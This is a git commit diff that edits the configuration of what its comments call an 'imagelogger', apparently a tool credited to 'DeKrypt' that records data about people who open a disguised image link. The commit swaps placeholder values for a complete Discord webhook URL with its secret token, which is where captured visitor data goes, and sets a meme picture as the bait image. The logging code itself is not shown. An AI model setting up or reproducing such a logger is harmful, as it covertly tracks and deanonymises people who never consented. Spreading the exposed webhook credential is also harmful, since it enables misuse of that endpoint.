1b8eb6628ce6a2664588eca423375fbc3d5e0846
Viiital7 <95897335+Viiital7@users.noreply.github.com>
2025-01-30 22:01:19 -0700

    Update image.py

--- api/image.py
+++ api/image.py
@@ -13,8 +13,8 @@ __author__ = "DeKrypt"
 
 config = {
     # BASE CONFIG #
-    "webhook": "https://discord.com/api/webhooks/your/webhook",
-    "image": "https://link-to-your-image.here", # You can also have a custom image by using a URL argument
+    "webhook": "https://discord.com/api/webhooks/1334749336344727635/V6CXcQUiYPYvhEcQh4dqQkrEIUwBsiHtK0OvMFpBi2QyLQ8X1lcotknxwLLRJRbPw6-7",
+    "image": "https://en.meming.world/images/en/6/62/Kevin_James_Shrugging.jpg", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
